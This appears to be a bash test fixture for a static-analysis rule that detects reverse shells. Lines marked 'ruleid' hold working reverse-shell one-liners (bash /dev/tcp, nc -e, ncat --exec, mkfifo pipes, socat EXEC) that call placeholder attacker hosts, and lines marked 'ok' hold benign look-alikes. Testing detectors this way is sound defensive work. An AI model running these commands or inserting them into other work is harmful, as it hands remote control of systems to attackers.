#!/usr/bin/env bash

# Direct /dev/tcp and /dev/udp shells.
# ruleid: bash-reverse-shell
bash -i >& /dev/tcp/192.0.2.10/4444 0>&1
# ruleid: bash-reverse-shell
/bin/sh -i 2>&1 > /dev/udp/example.com/53
# ruleid: bash-reverse-shell
zsh -i >/dev/tcp/198.51.100.2/9001 2>&1
# ruleid: bash-reverse-shell
true && /bin/bash -li >& /dev/tcp/attacker.example/443 0>&1
# ruleid: bash-reverse-shell
echo ready; bash -i >& /dev/tcp/attacker.example/4444 0>&1
# ruleid: bash-reverse-shell
echo 'ready'; sh -i 2>&1 > /dev/tcp/203.0.113.3/8080
# ruleid: bash-reverse-shell
bash -c 'bash -i >& /dev/tcp/attacker.example/4444 0>&1'

# Netcat variants.
# ruleid: bash-reverse-shell
nc 203.0.113.4 4444 -e /bin/sh
# ruleid: bash-reverse-shell
ncat --verbose -e bash attacker.example 8443
# ruleid: bash-reverse-shell
/usr/bin/ncat attacker.example 8443 --exec /bin/zsh
# ruleid: bash-reverse-shell
/bin/bash -i 2>&1 | netcat attacker.example 9000
# ruleid: bash-reverse-shell
mkfifo /tmp/pipe; cat /tmp/pipe | sh -i 2>&1 | /usr/bin/nc 203.0.113.8 8080 > /tmp/pipe

# Socat variant.
# ruleid: bash-reverse-shell
socat TCP:attacker.example:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Ordinary shell, socket-probing, and forwarding commands are not reverse shells.
# ok: bash-reverse-shell
bash -lc 'printf "hello\n"'
# ok: bash-reverse-shell
bash -i
# ok: bash-reverse-shell
bash -i 2>&1 | cat
# ok: bash-reverse-shell
sh -i > interactive-shell.log
# ok: bash-reverse-shell
nc -zv database.internal 5432
# ok: bash-reverse-shell
printf '' >/dev/tcp/database.internal/5432
# ok: bash-reverse-shell
socat TCP-LISTEN:8080,reuseaddr,fork TCP:app.internal:80
# ok: bash-reverse-shell
socat UNIX-LISTEN:/tmp/admin.sock EXEC:/bin/bash
# ok: bash-reverse-shell
echo 'bash -i >& /dev/tcp/192.0.2.10/4444 0>&1'
# ok: bash-reverse-shell
printf 'ncat -e /bin/sh attacker.example 4444\n'
# ok: bash-reverse-shell
printf 'safe; bash -i >& /dev/tcp/192.0.2.10/4444 0>&1\n'
# ok: bash-reverse-shell
echo 'safe && sh -i 2>&1 > /dev/udp/example.com/53'
# ok: bash-reverse-shell
nc files.internal 9000 > artifact.tar
# ok: bash-reverse-shell
cat artifact.tar | nc files.internal 9000
